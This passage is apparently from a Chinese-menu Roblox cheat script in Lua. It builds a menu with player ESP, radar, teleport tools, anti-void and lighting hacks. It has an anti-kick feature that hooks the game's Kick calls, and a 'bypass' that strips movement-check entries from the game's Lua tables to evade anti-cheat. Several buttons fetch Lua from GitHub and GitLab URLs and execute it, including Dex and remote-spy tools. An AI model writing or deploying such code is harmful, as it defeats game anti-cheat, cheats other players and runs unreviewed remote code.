if (BOOT and BOOT.finished) or (Library and Library.Unloaded) then break end
if getgenv().BSESPConfig.ESPEnabled then pcall(BSForceStreamAll) end
task.wait(3)
end
end)
local bsFrame=0
local function bsRenderTick()
bsFrame=bsFrame+1
if bsFrame%2~=0 then return end
pcall(updateBSGlobalDrawings)
pcall(updateBSRadar)
pcall(updateBSHighlights)
for player in pairs(BSESPComponents)do
pcall(updateBSEntity,player)
end
end
local function bsStartRender()
if BSRenderConn then return end
bsRenderOn=true
for _,player in pairs(BSPlayers:GetPlayers())do
if player~=BSLocalPlayer and not BSESPComponents[player] then
pcall(createBSESP,player)
end
end
BSRenderConn=BSRunService.Heartbeat:Connect(bsRenderTick)
end
local function bsStopRender()
bsRenderOn=false
if BSRenderConn then
pcall(function()BSRenderConn:Disconnect()end)
BSRenderConn=nil
end
end
if type(getgenv)=="function"then
getgenv().XJW_BSStartRender=bsStartRender
getgenv().XJW_BSStopRender=bsStopRender
end
__XJW_PACE()
BSESPBox:AddToggle("BS_ESP_Enabled",{Text="ESP总开关",Default=false}):OnChanged(function(v)
getgenv().BSESPConfig.ESPEnabled=v
if v then
local ok,err=pcall(bsStartRender)
if not ok then
__XJW_TIP("ESP 启动失败："..tostring(err):sub(1,80),8)
getgenv().BSESPConfig.ESPEnabled=false
end
else
pcall(bsStopRender)
end
end)
__XJW_PACE()
BSESPBox:AddToggle("BS_ShowBox",{Text="显示方框",Default=false}):OnChanged(function(v)
getgenv().BSESPConfig.ShowBox=v
end)
__XJW_PACE()
BSESPBox:AddToggle("BS_Show3DBox",{Text="显示3D方框",Default=false}):OnChanged(function(v)
getgenv().BSESPConfig.Show3DBox=v
end)
__XJW_PACE()
BSESPBox:AddToggle("BS_ShowHealth",{Text="显示血量",Default=false}):OnChanged(function(v)
getgenv().BSESPConfig.ShowHealth=v
end)
__XJW_PACE()
BSESPBox:AddToggle("BS_ShowName",{Text="显示名称",Default=false}):OnChanged(function(v)
getgenv().BSESPConfig.ShowName=v
end)
__XJW_PACE()
BSESPBox:AddToggle("BS_ShowDistance",{Text="显示距离",Default=false}):OnChanged(function(v)
getgenv().BSESPConfig.ShowDistance=v
end)
__XJW_PACE()
BSESPBox:AddToggle("BS_ShowTracer",{Text="显示射线",Default=false}):OnChanged(function(v)
getgenv().BSESPConfig.ShowTracer=v
end)
__XJW_PACE()
BSESPBox:AddToggle("BS_TeamCheck",{Text="队伍检查",Default=false}):OnChanged(function(v)
getgenv().BSESPConfig.TeamCheck=v
end)
__XJW_LBL("构建:趣味功能-美化包")
__XJW_GB("美化包")
local BeautifyGroup=Tabs.Visual:AddRightGroupbox("美化包","sparkles")
local function deleteAccessories(char)
char=char or getCharacter()
if not char then return end
for _,v in ipairs(char:GetChildren())do
if v:IsA("Accessory")then
pcall(function()v:Destroy()end)
end
end
end
local function deleteAccessoriesAndClothes(char)
char=char or getCharacter()
if not char then return end
for _,v in ipairs(char:GetChildren())do
if v:IsA("Accessory")or v:IsA("Shirt")or v:IsA("Pants")or v:IsA("ShirtGraphic")or v:IsA("BodyColors")then
pcall(function()v:Destroy()end)
end
end
for _,v in ipairs(char:GetDescendants())do
if v:IsA("Decal")or v:IsA("Texture")then
pcall(function()v:Destroy()end)
end
end
end
local function randomColor(char)
char=char or getCharacter()
if not char then return end
for _,v in ipairs(char:GetChildren())do
if v:IsA("BasePart")then
pcall(function()
v.BrickColor=BrickColor.Random()
v.Color=Color3.new(math.random(),math.random(),math.random())
end)
end
end
end
__XJW_PACE()
BeautifyGroup:AddButton("删除所有饰品",function()
deleteAccessories()
notify("美化","已删除所有饰品",3)
end)
local autoDeleteOnRespawn=false
__XJW_PACE()
BeautifyGroup:AddToggle("AutoDeleteOnRespawn",{
Text="重生自动删除饰品和衣服",
Default=false
}):OnChanged(function(v)
autoDeleteOnRespawn=v
notify("美化",v and "已开启重生自动删除"or "已关闭重生自动删除",3)
end)
__XJW_PACE()
BeautifyGroup:AddButton("删除所有饰品和衣服",function()
deleteAccessoriesAndClothes()
notify("美化","已删除所有饰品和衣服",3)
end)
__XJW_PACE()
BeautifyGroup:AddButton("角色随机颜色",function()
randomColor()
notify("美化","已应用随机颜色",3)
end)
local autoColorOnRespawn=false
__XJW_PACE()
BeautifyGroup:AddToggle("AutoColorOnRespawn",{
Text="重生自动应用随机颜色",
Default=false
}):OnChanged(function(v)
autoColorOnRespawn=v
notify("美化",v and "已开启重生随机颜色"or "已关闭重生随机颜色",3)
end)
local rainbowOn=false
local rainbowConn=nil
__XJW_PACE()
BeautifyGroup:AddToggle("RainbowCharacter",{
Text="彩虹角色 (Neon循环变色)",
Default=false
}):OnChanged(function(v)
rainbowOn=v
if v then
notify("美化","已开启彩虹角色",3)
local hue=0
pcall(function()
if rainbowConn then rainbowConn:Disconnect()end
rainbowConn=RunService.Heartbeat:Connect(function()
if not rainbowOn then return end
hue=hue+0.005
if hue>1 then hue=0 end
local color=Color3.fromHSV(hue,1,1)
local char=getCharacter()
if char then
for _,part in ipairs(char:GetChildren())do
if part:IsA("BasePart")then
pcall(function()
part.Color=color
part.Material=Enum.Material.Neon
end)
end
end
end
end)
end)
else
notify("美化","已关闭彩虹角色",3)
if rainbowConn then
rainbowConn:Disconnect()
rainbowConn=nil
end
local char=getCharacter()
if char then
for _,part in ipairs(char:GetChildren())do
if part:IsA("BasePart")then
pcall(function()part.Material=Enum.Material.Plastic end)
end
end
end
end
end)
local brokenLegOn=false
local function applyKorblox(char)
char=char or getCharacter()
if not char then return end
local rightLeg=char:FindFirstChild("Right Leg")or char:FindFirstChild("RightLeg")
if not rightLeg then return end
local existing=rightLeg:FindFirstChildOfClass("SpecialMesh")
if existing then existing:Destroy()end
local mesh=Instance.new("SpecialMesh")
mesh.MeshId="rbxassetid://6658418826"
mesh.TextureId="rbxassetid://6658420819"
mesh.Scale=Vector3.new(1,1,1)
mesh.VertexColor=Vector3.new(1,1,1)
mesh.Parent=rightLeg
end
local function removeKorblox(char)
char=char or getCharacter()
if not char then return end
local rightLeg=char:FindFirstChild("Right Leg")or char:FindFirstChild("RightLeg")
if not rightLeg then return end
local mesh=rightLeg:FindFirstChildOfClass("SpecialMesh")
if mesh then mesh:Destroy()end
end
__XJW_PACE()
BeautifyGroup:AddToggle("BrokenLeg",{
Text="断腿 (Korblox右腿)",
Default=false
}):OnChanged(function(v)
brokenLegOn=v
if v then
applyKorblox()
notify("美化","已应用断腿",3)
else
removeKorblox()
notify("美化","已恢复右腿",3)
end
end)
local headlessOn=false
local originalHeadTransparency=0
__XJW_PACE()
BeautifyGroup:AddToggle("Headless",{
Text="无头 (头部透明)",
Default=false
}):OnChanged(function(v)
headlessOn=v
local char=getCharacter()
if not char then return end
local head=char:FindFirstChild("Head")
if not head then return end
if v then
originalHeadTransparency=head.Transparency
pcall(function()
head.Transparency=1
for _,d in ipairs(head:GetChildren())do
if d:IsA("Decal")or d:IsA("Texture")then
d:Destroy()
end
end
end)
notify("美化","已应用无头",3)
else
pcall(function()
head.Transparency=originalHeadTransparency
end)
notify("美化","已恢复头部",3)
end
end)
LocalPlayer.CharacterAdded:Connect(function(char)
task.wait(0.5)
if autoDeleteOnRespawn then
deleteAccessoriesAndClothes(char)
end
if autoColorOnRespawn then
randomColor(char)
end
if brokenLegOn then
applyKorblox(char)
end
if headlessOn then
pcall(function()
local head=char:FindFirstChild("Head")
if head then
originalHeadTransparency=head.Transparency
head.Transparency=1
for _,d in ipairs(head:GetChildren())do
if d:IsA("Decal")or d:IsA("Texture")then
d:Destroy()
end
end
end
end)
end
end)
__XJW_GB("其他设置")
local BSESPRightBox=Tabs.Visual:AddRightGroupbox("其他设置","settings")
__XJW_PACE()
BSESPRightBox:AddToggle("BS_ShowSkeleton",{Text="显示骨骼",Default=false}):OnChanged(function(v)
getgenv().BSESPConfig.ShowSkeleton=v
end)
__XJW_PACE()
BSESPRightBox:AddToggle("BS_ShowRadar",{Text="显示雷达",Default=false}):OnChanged(function(v)
getgenv().BSESPConfig.ShowRadar=v
end)
__XJW_PACE()
BSESPRightBox:AddToggle("BS_ShowPlayerCount",{Text="显示玩家计数",Default=false}):OnChanged(function(v)
getgenv().BSESPConfig.ShowPlayerCount=v
end)
__XJW_PACE()
BSESPRightBox:AddToggle("BS_ShowWeapon",{Text="显示武器",Default=false}):OnChanged(function(v)
getgenv().BSESPConfig.ShowWeapon=v
end)
__XJW_PACE()
BSESPRightBox:AddToggle("BS_RainbowMode",{Text="彩虹色模式",Default=false}):OnChanged(function(v)
getgenv().BSESPConfig.RainbowMode=v
end)
__XJW_PACE()
BSESPRightBox:AddToggle("BS_HighlightPlayers",{Text="高亮玩家",Default=false}):OnChanged(function(v)
getgenv().BSESPConfig.HighlightPlayers=v
end)
end)
local Players=game:GetService("Players")
local RunService=game:GetService("RunService")
local Lighting=game:GetService("Lighting")
local StarterGui=game:GetService("StarterGui")
local VirtualUser=game:GetService("VirtualUser")
local LocalPlayer=Players.LocalPlayer
local _newcclosure=newcclosure or function(f)return f end
local _hookmetamethod=hookmetamethod
local _hookfunction=hookfunction
local _getnamecallmethod=getnamecallmethod
local _checkcaller=checkcaller
local _getgc=getgc
Notify=function(title,text,duration)
duration=duration or 3
pcall(function()
StarterGui:SetCore("SendNotification",{
Title=title,
Text=text,
Duration=duration
})
end)
end
local function getCharacterRoot()
local char=LocalPlayer.Character
if not char then return nil,nil end
local root=char:FindFirstChild("HumanoidRootPart")or char:FindFirstChild("Torso")or char:FindFirstChild("UpperTorso")
return char,root
end
__XJW_GB("夜视功能")
local NightVisionBox=Tabs.Main:AddLeftGroupbox("夜视功能","moon")
local nightVisionEnabled=false
local nightVisionConn=nil
local originalLighting={}
local function saveOriginalLighting()
originalLighting.ClockTime=Lighting.ClockTime
originalLighting.Brightness=Lighting.Brightness
originalLighting.ExposureCompensation=Lighting.ExposureCompensation
originalLighting.Ambient=Lighting.Ambient
originalLighting.OutdoorAmbient=Lighting.OutdoorAmbient
originalLighting.GlobalShadows=Lighting.GlobalShadows
end
local function restoreOriginalLighting()
pcall(function()
Lighting.ClockTime=originalLighting.ClockTime or 14
Lighting.Brightness=originalLighting.Brightness or 2
Lighting.ExposureCompensation=originalLighting.ExposureCompensation or 0
Lighting.Ambient=originalLighting.Ambient or Color3.fromRGB(128,128,128)
Lighting.OutdoorAmbient=originalLighting.OutdoorAmbient or Color3.fromRGB(128,128,128)
Lighting.GlobalShadows=originalLighting.GlobalShadows
end)
end
__XJW_PACE()
NightVisionBox:AddToggle("NightVisionToggle",{
Text="夜视模式",
Default=false,
}):OnChanged(function(v)
nightVisionEnabled=v
if v then
saveOriginalLighting()
if nightVisionConn then nightVisionConn:Disconnect()end
nightVisionConn=RunService.RenderStepped:Connect(function()
Lighting.ClockTime=15
Lighting.Brightness=2
Lighting.ExposureCompensation=0.5
Lighting.Ambient=Color3.fromRGB(255,255,255)
Lighting.OutdoorAmbient=Color3.fromRGB(255,255,255)
end)
Notify("夜视","夜视模式已开启",3)
else
if nightVisionConn then
nightVisionConn:Disconnect()
nightVisionConn=nil
end
restoreOriginalLighting()
Notify("夜视","夜视模式已关闭，已恢复原值",3)
end
end)
__XJW_GB("防虚空")
local AntiVoidBox=Tabs.Main:AddLeftGroupbox("防虚空","shield")
local antiVoidThreshold=-100
__XJW_PACE()
AntiVoidBox:AddSlider("AntiVoid_Threshold",{
Text="触发高度(Y轴)",
Default=-100,
Min=-1000,
Max=0,
Rounding=0,
}):OnChanged(function(val)
antiVoidThreshold=val
end)
local bsAntiVoid={
_enabled=false,
_loop=nil,
_voidY=-100,
_platform=nil,
}
function bsAntiVoid:_createPlatform()
if self._platform then
self._platform:Destroy()
end
self._platform=Instance.new("Part")
self._platform.Name="AntiVoidPlatform"
self._platform.Size=Vector3.new(50,2,50)
self._platform.Anchored=true
self._platform.CanCollide=true
self._platform.Material=Enum.Material.Plastic
self._platform.Transparency=0.9
self._platform.BrickColor=BrickColor.new("Institutional white")
self._platform.Parent=workspace
end
function bsAntiVoid:_core()
self._voidY=antiVoidThreshold
local character=LocalPlayer.Character
if not character then return end
local rootPart=character:FindFirstChild("HumanoidRootPart")
local humanoid=character:FindFirstChildOfClass("Humanoid")
if rootPart and humanoid and humanoid.Health>0 then
if rootPart.Position.Y<self._voidY then
if not self._platform then
self:_createPlatform()
end
self._platform.Position=Vector3.new(
rootPart.Position.X,
self._voidY-5,
rootPart.Position.Z
)
rootPart.CFrame=CFrame.new(rootPart.Position.X,self._voidY+3,rootPart.Position.Z)
rootPart.Velocity=Vector3.new(0,0,0)
else
if self._platform then
self._platform:Destroy()
self._platform=nil
end
end
else
if self._platform then
self._platform:Destroy()
self._platform=nil
end
end
end
function bsAntiVoid:enable()
self._enabled=true
if self._loop then self._loop:Disconnect()end
self._loop=RunService.RenderStepped:Connect(function()
self:_core()
end)
LocalPlayer.CharacterAdded:Connect(function(newChar)
newChar:WaitForChild("HumanoidRootPart")
if self._enabled and not self._loop then
self:enable()
end
end)
Notify("防虚空","防虚空已开启, 触发高度: "..self._voidY,3)
end
function bsAntiVoid:disable()
self._enabled=false
if self._loop then
self._loop:Disconnect()
self._loop=nil
end
if self._platform then
self._platform:Destroy()
self._platform=nil
end
Notify("防虚空","防虚空已关闭",3)
end
__XJW_PACE()
AntiVoidBox:AddToggle("AntiVoidToggle",{
Text="防虚空掉落",
Default=false,
}):OnChanged(function(state)
if state then
bsAntiVoid:enable()
else
bsAntiVoid:disable()
end
end)
__XJW_LBL("构建:趣味功能-优化页")
__XJW_GB("防卡顿优化")
local OptimizeBox=Tabs.Main:AddLeftGroupbox("防卡顿优化","gauge")
local optimizeEnabled=false
local optimizeOriginal={}
local disabledParticles={}
local function applyOptimization()
optimizeOriginal.GlobalShadows=Lighting.GlobalShadows
Lighting.GlobalShadows=false
optimizeOriginal.PostEffects={}
for _,obj in ipairs(Lighting:GetChildren())do
if obj:IsA("PostEffect")
or obj:IsA("BloomEffect")
or obj:IsA("ColorCorrectionEffect")
or obj:IsA("SunRaysEffect")
or obj:IsA("BlurEffect")
or obj:IsA("DepthOfFieldEffect")then
table.insert(optimizeOriginal.PostEffects,{obj=obj,enabled=obj.Enabled})
obj.Enabled=false
end
end
pcall(function()
if workspace.StreamingEnabled then
optimizeOriginal.StreamingTargetRadius=workspace.StreamingTargetRadius
optimizeOriginal.StreamingMinRadius=workspace.StreamingMinRadius
workspace.StreamingTargetRadius=1000000
workspace.StreamingMinRadius=1000000
end
end)
disabledParticles={}
for _,obj in ipairs(workspace:GetDescendants())do
if obj:IsA("ParticleEmitter")or obj:IsA("Trail")or obj:IsA("Beam")then
if obj.Enabled then
table.insert(disabledParticles,obj)
obj.Enabled=false
end
end
end
end
local function restoreOptimization()
pcall(function()
Lighting.GlobalShadows=optimizeOriginal.GlobalShadows
end)
if optimizeOriginal.PostEffects then
for _,entry in ipairs(optimizeOriginal.PostEffects)do
pcall(function()entry.obj.Enabled=entry.enabled end)
end
optimizeOriginal.PostEffects={}
end
pcall(function()
if workspace.StreamingEnabled then
if optimizeOriginal.StreamingTargetRadius then workspace.StreamingTargetRadius=optimizeOriginal.StreamingTargetRadius end
if optimizeOriginal.StreamingMinRadius then workspace.StreamingMinRadius=optimizeOriginal.StreamingMinRadius end
end
end)
for _,obj in ipairs(disabledParticles)do
pcall(function()obj.Enabled=true end)
end
disabledParticles={}
end
__XJW_PACE()
OptimizeBox:AddToggle("OptimizeToggle",{
Text="性能优化",
Default=false,
}):OnChanged(function(v)
optimizeEnabled=v
if v then
applyOptimization()
Notify("防卡顿优化","优化已开启",3)
else
restoreOptimization()
Notify("防卡顿优化","已恢复原设置",3)
end
end)
__XJW_GB("防踢功能")
local AntiKickBox=Tabs.Main:AddRightGroupbox("防踢功能","shield-check")
local antiKickApplied=false
local function setupAntiKick()
if antiKickApplied then
Notify("防踢","防踢已启用，无需重复",3)
return
end
local ok1=false
if _hookmetamethod then
ok1=pcall(function()
local oldNamecall
oldNamecall=_hookmetamethod(game,"__namecall",_newcclosure(function(self,...)
local method=_getnamecallmethod and _getnamecallmethod()or ""
if method=="Kick"then
local isCaller=_checkcaller and _checkcaller()
if not isCaller then
Notify("防踢","拦截 __namecall Kick 调用",4)
return nil
end
end
return oldNamecall(self,...)
end))
end)
end
local ok2=false
if _hookfunction then
ok2=pcall(function()
local oldKick
oldKick=_hookfunction(LocalPlayer.Kick,_newcclosure(function(...)
Notify("防踢","拦截 LocalPlayer.Kick 调用",4)
return nil
end))
end)
end
if ok1 or ok2 then
antiKickApplied=true
Notify("防踢","防踢已启用，将拦截所有Kick调用",4)
else
Notify("防踢","防踢启用失败，执行器可能不支持",4)
end
end
__XJW_PACE()
AntiKickBox:AddButton("启用防踢",function()
setupAntiKick()
end)
__XJW_GB("绕过功能")
local BypassBox=Tabs.Main:AddRightGroupbox("绕过功能","unlock")
__XJW_PACE()
BypassBox:AddButton("绕过反作弊(Adonis)",function()
local ok,err=pcall(function()
error("该脚本暂无可用下载源")
end)
if ok then
Notify("绕过","绕过反作弊脚本已加载",3)
else
Notify("绕过","加载失败: "..tostring(err),4)
end
end)
local walkSpeedProtected=false
__XJW_PACE()
BypassBox:AddButton("绕过移动检测",function()
local cleared=0
if _getgc then
pcall(function()
local keys={"restrictTeleport","checkCFrame","validateMove","restrictMove"}
for _,v in ipairs(_getgc())do
if type(v)=="table"then
for _,key in ipairs(keys)do
if rawget(v,key)~=nil then
pcall(function()
rawset(v,key,nil)
end)
cleared=cleared+1
end
end
end
end
end)
end
if not walkSpeedProtected then
walkSpeedProtected=true
task.spawn(function()
while walkSpeedProtected do
pcall(function()
local char,root=getCharacterRoot()
if char then
local hum=char:FindFirstChildOfClass("Humanoid")
if hum and hum.WalkSpeed<16 then
hum.WalkSpeed=16
end
end
end)
task.wait(0.5)
end
end)
end
Notify("绕过",string.format("移动检测已绕过(清理%d项)，WalkSpeed保护已开启",cleared),4)
end)
do
local Tabs_Tools=Window:AddTab("工具","wrench")
local Players=game:GetService("Players")
local Workspace=game:GetService("Workspace")
local StarterGui=game:GetService("StarterGui")
local UserInputService=game:GetService("UserInputService")
local LocalPlayer=Players.LocalPlayer
local CoordDropdown
local selectedCoord=""
local SavedCoords={}
local coordCounter=0
local function notify(title,text,duration)
duration=duration or 3
pcall(function()
StarterGui:SetCore("SendNotification",{
Title=title,
Text=text,
Duration=duration
})
end)
end
getCharacter=function()
return LocalPlayer.Character
end
local function getRootPart()
local char=getCharacter()
if char then
return char:FindFirstChild("HumanoidRootPart")or char.PrimaryPart
end
end
local function getHumanoid()
local char=getCharacter()
if char then
return char:FindFirstChildOfClass("Humanoid")
end
end
local function refreshCoordDropdown()
local names={}
for name in pairs(SavedCoords)do
table.insert(names,name)
end
table.sort(names)
if CoordDropdown then
CoordDropdown:SetValues(names)
end
end
__XJW_GB("坐标管理")
local CoordGroup=Tabs_Tools:AddLeftGroupbox("坐标管理","map-pin")
__XJW_PACE()
CoordGroup:AddButton("保存当前坐标",function()
local root=getRootPart()
if not root then
notify("坐标","未找到角色",3)
return
end
coordCounter=coordCounter+1
local name="coord"..coordCounter
SavedCoords[name]=root.Position
notify("坐标保存",name.." 已保存: "..tostring(root.Position),3)
refreshCoordDropdown()
end)
local customCoordInput=CoordGroup:AddInput("CustomCoordName",{
Text="自定义坐标名",
Default="",
Numeric=false
})
local customCoordName=""
customCoordInput:OnChanged(function(text)
customCoordName=text or ""
end)
__XJW_PACE()
CoordGroup:AddButton("保存自定义坐标",function()
local root=getRootPart()
if not root then
notify("坐标","未找到角色",3)
return
end
local name=customCoordName
if not name or name==""then
notify("坐标","请输入坐标名称",3)
return
end
SavedCoords[name]=root.Position
notify("坐标保存",name.." 已保存",3)
refreshCoordDropdown()
end)
__XJW_PACE()
CoordGroup:AddLabel("已保存坐标列表")
CoordDropdown=CoordGroup:AddDropdown("CoordList",{
Text="坐标列表",
Values={},
Default="",
Multi=false
})
CoordDropdown:OnChanged(function(v)
selectedCoord=v
end)
__XJW_PACE()
CoordGroup:AddButton("传送到选中坐标",function()
if selectedCoord==""or not SavedCoords[selectedCoord]then
notify("传送","请选择有效坐标",3)
return
end
local root=getRootPart()
if not root then
notify("传送","未找到角色",3)
return
end
root.CFrame=CFrame.new(SavedCoords[selectedCoord])
notify("传送","已传送到 "..selectedCoord,3)
end)
local loopTeleport=false
local loopConn=nil
__XJW_PACE()
CoordGroup:AddToggle("LoopTeleport",{
Text="循环传送选中坐标",
Default=false
}):OnChanged(function(v)
loopTeleport=v
if v then
notify("循环传送","已开启循环传送",3)
pcall(function()
if loopConn then loopConn:Disconnect()end
loopConn=RunService.Heartbeat:Connect(function()
if loopTeleport and selectedCoord~=""and SavedCoords[selectedCoord]then
local root=getRootPart()
if root then
root.CFrame=CFrame.new(SavedCoords[selectedCoord])
end
end
end)
end)
else
notify("循环传送","已关闭循环传送",3)
if loopConn then
loopConn:Disconnect()
loopConn=nil
end
end
end)
__XJW_GB("传送工具")
local TeleportGroup=Tabs_Tools:AddLeftGroupbox("传送工具","navigation")
__XJW_PACE()
TeleportGroup:AddButton("点击传送",function()
pcall(function()
for _,item in ipairs(LocalPlayer.Backpack:GetChildren())do
if item:IsA("Tool")and item.Name=="[XJW]传送工具"then
item:Destroy()
end
end
local tool=Instance.new("Tool")
tool.Name="[XJW]传送工具"
tool.RequiresHandle=false
tool.ToolTip="点击任意位置传送"
tool.Parent=LocalPlayer.Backpack
tool.Activated:Connect(function()
local root=getRootPart()
local char=getCharacter()
if not root or not char then return end
local mouse=LocalPlayer:GetMouse()
local rayParams=RaycastParams.new()
rayParams.FilterDescendantsInstances={char}
rayParams.FilterType=Enum.RaycastFilterType.Exclude
local origin=mouse.UnitRay.Origin
local direction=mouse.UnitRay.Direction*1000
local result=Workspace:Raycast(origin,direction,rayParams)
if result then
root.CFrame=CFrame.new(result.Position+Vector3.new(0,3,0))
notify("传送","已传送到点击位置",2)
else
root.CFrame=mouse.Hit
notify("传送","已传送到点击位置",2)
end
end)
notify("传送工具","[XJW]传送工具 已创建，装备后点击传送",4)
end)
end)
__XJW_GB("坐标工具")
local CoordToolGroup=Tabs_Tools:AddRightGroupbox("坐标工具","compass")
__XJW_PACE()
CoordToolGroup:AddButton("保存坐标到文件",function()
pcall(function()
local data={}
for name,pos in pairs(SavedCoords)do
table.insert(data,string.format('["%s"] = Vector3.new(%f, %f, %f)',name,pos.X,pos.Y,pos.Z))
end
local content="return {\n  "..table.concat(data,",\n  ").."\n}"
writefile("SavedCoords.txt",content)
setclipboard(content)
notify("坐标","已保存到文件并复制到剪贴板",4)
end)
end)
__XJW_PACE()
CoordToolGroup:AddButton("删除选中坐标",function()
if selectedCoord==""or not SavedCoords[selectedCoord]then
notify("坐标","请选择有效坐标",3)
return
end
SavedCoords[selectedCoord]=nil
notify("坐标","已删除 "..selectedCoord,3)
refreshCoordDropdown()
end)
__XJW_PACE()
CoordToolGroup:AddButton("删除全部坐标",function()
SavedCoords={}
coordCounter=0
selectedCoord=""
refreshCoordDropdown()
notify("坐标","已删除全部坐标",3)
end)
__XJW_PACE()
CoordToolGroup:AddButton("复制当前坐标",function()
local root=getRootPart()
if not root then
notify("坐标","未找到角色",3)
return
end
local pos=root.Position
local text=string.format("%f, %f, %f",pos.X,pos.Y,pos.Z)
setclipboard(text)
notify("坐标","当前坐标已复制: "..text,4)
end)
__XJW_GB("IY指令")
local IYBox=Tabs_Tools:AddRightGroupbox("IY指令","terminal")
__XJW_PACE()
IYBox:AddButton("执行Dex",function()
safeLoad("https://github.com/AZYsGithub/DexPlusPlus/releases/latest/download/out.lua")
end)
__XJW_PACE()
IYBox:AddButton("执行rspy",function()
safeLoad("https://raw.githubusercontent.com/infyiff/backup/main/SimpleSpyV3/main.lua")
end)
__XJW_PACE()
IYBox:AddButton("执行Cspy",function()
safeLoad("https://gitlab.com/upio/cobalt/-/releases/permalink/latest/downloads/Cobalt.luau")
end)
__XJW_PACE()
IYBox:AddButton("执行mdex",function()
safeLoad("https://raw.githubusercontent.com/infyiff/backup/main/dex.lua")
end)
__XJW_GB("动作功能")
local ActionBoxR=Tabs.Function:AddRightGroupbox("动作功能","clapperboard")
__XJW_PACE()
ActionBoxR:AddButton("R6动作包",function()
pcall(function()
safeLoad("https://raw.githubusercontent.com/GreenNumber42/Roblox-Scripts/main/R6Animations.lua")
end)
notify("动作","正在加载R6动作包",3)
end)
__XJW_LBL("构建:趣味功能-动作")
__XJW_PACE()
ActionBoxR:AddButton("动作V2",function()
pcall(function()
safeLoad("https://raw.githubusercontent.com/GreenNumber42/Roblox-Scripts/main/EmotesV2.lua")
end)
notify("动作","正在加载动作V2",3)
end)
__XJW_PACE()
ActionBoxR:AddButton("海贼王霸气",function()
__XJW_RUN("https://raw.githubusercontent.com/jiuyijiuyijiuyi91/91917878/refs/heads/main/%E6%B5%B7%E8%B4%BC%E7%8E%8B%E9%9C%B8%E6%B0%94.lua","海贼王霸气")
end)
__XJW_PACE()
ActionBoxR:AddButton("诡异动作包",function()
__XJW_RUN("https://raw.githubusercontent.com/jiuyijiuyijiuyi91/91917878/refs/heads/main/%E8%AF%A1%E5%BC%82%E5%8A%A8%E4%BD%9C%E5%8C%85.lua","诡异动作包")
end)
__XJW_PACE()
ActionBoxR:AddButton("橡胶果实第二形态",function()
__XJW_RUN("https://raw.githubusercontent.com/jiuyijiuyijiuyi91/91917878/refs/heads/main/%E6%A9%A1%E8%83%B6%E6%9E%9C%E5%AE%9E%E7%AC%AC%E4%BA%8C%E5%BD%A2%E6%80%81.lua","橡胶果实第二形态")
end)
__XJW_PACE()
ActionBoxR:AddButton("快速弗雷德熊",function()
local neededFiles={}
for i=1,20 do
local n=string.format("%03d",i)
table.insert(neededFiles,"Fredscare/ezgif-frame-"..n..".png")
end
table.insert(neededFiles,"Fredbear.rbxmx")
local HasFiles=true
for _,file in ipairs(neededFiles)do
if not isfile(file)then
HasFiles=false
break
end
end
if HasFiles then
__XJW_RUN("https://raw.githubusercontent.com/ian49972/SCRIPTS/refs/heads/main/Fredbear","Fredbear")
return
end
local PlayerGui=game.Players.LocalPlayer:WaitForChild("PlayerGui")
local ScreenGui=Instance.new("ScreenGui")
ScreenGui.IgnoreGuiInset=true
ScreenGui.ResetOnSpawn=false
ScreenGui.Parent=PlayerGui
local Frame=Instance.new("Frame")
Frame.Size=UDim2.new(1,0,1,0)
Frame.BackgroundColor3=Color3.fromRGB(0,0,0)
Frame.Parent=ScreenGui
local LoadingText=Instance.new("TextLabel")
LoadingText.Size=UDim2.new(1,0,0,50)
LoadingText.Position=UDim2.new(0,0,0.3,0)
LoadingText.BackgroundTransparency=1
LoadingText.Text="Loading..."
LoadingText.TextColor3=Color3.fromRGB(255,255,255)
LoadingText.TextScaled=true
LoadingText.Parent=Frame
local InfoText=Instance.new("TextLabel")
InfoText.Size=UDim2.new(1,0,0,30)
InfoText.Position=UDim2.new(0,0,0.48,0)
InfoText.BackgroundTransparency=1
InfoText.Text="This screen will not appear if you use the script again"
InfoText.TextColor3=Color3.fromRGB(200,200,200)
InfoText.TextScaled=true
InfoText.Parent=Frame
local BarBG=Instance.new("Frame")
BarBG.AnchorPoint=Vector2.new(0.5,0.5)
BarBG.Position=UDim2.new(0.5,0,0.8,0)
BarBG.Size=UDim2.new(0.6,0,0.05,0)
BarBG.BackgroundColor3=Color3.fromRGB(50,50,50)
BarBG.Parent=Frame
local bgCorner=Instance.new("UICorner")
bgCorner.CornerRadius=UDim.new(0,12)
bgCorner.Parent=BarBG
local Bar=Instance.new("Frame")
Bar.Size=UDim2.new(0,0,1,0)
Bar.BackgroundColor3=Color3.fromRGB(255,230,0)
Bar.Parent=BarBG
local barCorner=Instance.new("UICorner")
barCorner.CornerRadius=UDim.new(0,12)
barCorner.Parent=Bar
local function UpdateBar(p)
Bar.Size=UDim2.new(p,0,1,0)
end
if not isfolder("Fredscare")then
makefolder("Fredscare")
end
local total=21
local count=0
for i=1,20 do
local n=string.format("%03d",i)
if not isfile("Fredscare/ezgif-frame-"..n..".png")then
writefile("Fredscare/ezgif-frame-"..n..".png",
(__XJW_FETCH("https://raw.githubusercontent.com/ian49972/IMAGES/refs/heads/main/ezgif-frame-"..n..".png") or "")
)
end
count=count+1
UpdateBar(count/total)
end
if not isfile("Fredbear.rbxmx")then
writefile("Fredbear.rbxmx",
(__XJW_FETCH("https://raw.githubusercontent.com/ian49972/RBXMS/refs/heads/main/Fredbear.rbxmx") or "")
)
end
count=count+1
UpdateBar(count/total)
ScreenGui:Destroy()
__XJW_RUN("https://raw.githubusercontent.com/ian49972/SCRIPTS/refs/heads/main/Fredbear","Fredbear")
end)
__XJW_PACE()
ActionBoxR:AddLabel("播放自定义动画")
local animIdInput=ActionBoxR:AddInput("PlayAnimID",{
Text="动画ID",
Default="",
Numeric=true
})
local playAnimID=""
animIdInput:OnChanged(function(text)
playAnimID=text or ""
end)
__XJW_PACE()
ActionBoxR:AddButton("播放动画",function()
local id=tonumber(playAnimID)
if not id then
notify("动画","请输入有效动画ID",3)
return
end
local okAnim,animErr=pcall(function()
local humanoid=getHumanoid()
local char=getCharacter()
if not humanoid or not char then
notify("动画","未找到角色",3)
return
end
local animator=humanoid:FindFirstChildOfClass("Animator")
if not animator then
animator=char:FindFirstChildOfClass("Animator")
end
if not animator then
animator=humanoid:FindFirstChild("Animator")
end
if not animator then
animator=Instance.new("Animator")
animator.Parent=humanoid
end
local anim=Instance.new("Animation")
anim.AnimationId="rbxassetid://"..tostring(id)
task.spawn(function()
local track=animator:LoadAnimation(anim)
local tOk,tErr=pcall(function()
track:Play()
end)
if tOk then
notify("动画","正在播放动画 "..id,3)
else
notify("动画","播放失败：该动画ID不可用或被限制",4)
end
end)
end)
if not okAnim then
